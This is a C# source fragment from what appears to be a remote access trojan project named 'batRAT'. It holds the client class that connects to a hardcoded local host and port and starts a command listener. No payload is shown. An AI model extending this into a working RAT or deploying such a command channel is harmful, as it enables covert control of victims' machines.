using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;

using batRAT;
using batRAT.Commands;

namespace Client.Core {
    public class bClient {

        public Listener listener;

        Socket clientSocket;
        IPEndPoint ipEndPoint;

        public bClient(IPEndPoint _ipEndPoint) {
            ipEndPoint = _ipEndPoint;
            clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            clientSocket.BeginConnect("127.0.0.1", 5454, OnConnect, clientSocket);
        }

        void OnConnect(IAsyncResult ar) {
            clientSocket = (Socket)ar.AsyncState;
            clientSocket.EndConnect(ar);
            listener = new Listener(clientSocket);
            Console.WriteLine("Connected to " + clientSocket.RemoteEndPoint.ToString());
            listener.StartReceive();
        }

        
    }
}
